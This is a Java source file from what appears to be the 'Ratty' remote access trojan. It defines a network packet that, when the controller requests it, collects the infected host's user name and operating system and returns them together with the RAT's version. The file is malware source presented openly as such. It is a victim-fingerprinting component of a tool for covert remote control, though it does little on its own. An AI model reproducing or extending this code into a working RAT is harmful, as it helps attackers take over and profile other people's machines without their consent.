package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.Ratty;

public final class InformationPacket implements IPacket {
	
	private String name, os, version;
	
	private byte type;
	
	private static final byte REQUEST = 0;
	private static final byte DATA = 1;
	
	public InformationPacket(final String name, final String os, final String version) {
		this.name = name;
		this.os = os;
		this.version = version;
		
		type = DATA;
	}
	
	public InformationPacket() {
		this("", "", "");
		
		type = REQUEST;
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeUTF(name);
		client.writeUTF(os);
		client.writeUTF(version);
		client.writeByte(type);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		name = client.readUTF();
		os = client.readUTF();
		version = client.readUTF();
		type = client.readByte();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		if (type == REQUEST) {
			final String name = System.getProperty("user.name");
			final String os = System.getProperty("os.name");
			final InformationPacket packet = new InformationPacket(name, os, Ratty.VERSION);
			
			client.addPacket(packet);
		}
	}
	
	public String getName() {
		return name;
	}
	
	public String getOS() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
}
